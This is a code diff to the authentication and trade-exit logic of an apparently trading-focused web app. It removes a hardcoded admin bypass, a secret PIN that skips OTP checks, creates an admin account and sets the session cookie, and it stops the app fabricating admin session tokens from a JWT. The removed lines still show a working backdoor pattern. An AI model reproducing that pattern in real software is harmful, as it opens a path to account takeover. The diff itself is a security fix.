@@ -1728,7 +1728,7 @@ export const appRouter = router({
         // Apply demo-mode brokerage + slippage (consistent with auto-exit paths)
         if (trade.mode === "demo") {
           const pc = getDemoCostConfig();
-          remainPnl = applyDemoCosts(remainPnl, trade.entryPrice, input.exitPrice, remainingQty, pc.brokerage, pc.slippagePct);
+          remainPnl = applyDemoCosts(remainPnl, trade.entryPrice, input.exitPrice, remainingQty, pc.brokeragePer, pc.slippagePct);
         }
         // Include already-booked partial profits in total P&L
         const pnl = remainPnl + (trade.bookedPnl ?? 0);
@@ -4936,34 +4936,9 @@ const tokenRow = await db.select({ accessToken: uc2.accessToken })
         if (!mobile.startsWith("+")) {
           mobile = "+91" + mobile;
         }
-        // ── Admin Bypass: Accepts PIN 270290 & sets scalpbot_auth cookie ──
-        if (input.code === "270290") {
-          const db = await getDb();
-          if (db) {
-            const existingUsers = await db.select().from(appUsers).where(eq(appUsers.mobile, mobile)).limit(1);
-            let user = existingUsers[0];
-            if (!user) {
-              const res = await db.insert(appUsers).values({
-                mobile,
-                role: "admin",
-                sessionToken: input.sessionToken || "admin_session",
-              });
-              const insertId = Number((res as any)[0]?.insertId);
-              user = (await getAppUserById(insertId))!;
-            }
-            if (user) {
-              const token = signMobileAuthToken({
-                userId: user.id,
-                mobile: user.mobile,
-                role: "admin",
-              });
-              if (ctx.res) {
-                ctx.res.cookie("scalpbot_auth", token, getMobileAuthCookieOptions());
-              }
-              return { success: true, user, token };
-            }
-          }
-        }
+        // SECURITY: No secret-PIN path. Admin privileges are granted ONLY by the
+        // configured ADMIN_MOBILE matching the mobile number after OTP verification
+        // (verified in verifyOtp → db.ts strictUserLookup).
         const result = await verifyOtp(mobile, input.code, input.sessionToken);
         if (!result.success || !result.user) {
           return { success: false, message: result.message ?? "Verification failed" };
@@ -5020,16 +4995,21 @@ me: publicProcedure
             };
           }
         } catch (e) {
-          console.warn("[mobileAuth.me] DB lookup delayed, falling back to JWT payload:", e);
+          console.warn("[mobileAuth.me] DB lookup delayed:", e);
+          // Return a JWT-only snapshot rather than blocking the whole app during a
+          // transient DB hiccup — but the SERVER-OWNED durable sessionToken is NOT
+          // fabricated; the dashboard bootstrapper re-derives it from DB once reachable.
+          return {
+            id: decoded.userId,
+            mobile: decoded.mobile,
+            name: undefined,
+            role: decoded.role,
+            sessionToken: undefined,
+          };
         }
 
-        return {
-          id: decoded.userId,
-          mobile: decoded.mobile,
-          name: decoded.role === "admin" ? "Admin" : "User",
-          role: decoded.role,
-          sessionToken: decoded.role === "admin" ? "admin_session" : `user_${decoded.userId}`,
-        };
+        // Token valid but user no longer exists / revoked → refuse access.
+        return null;
       }),
     updateName: publicProcedure
       .input(z.object({ name: z.string().min(1).max(128) }))
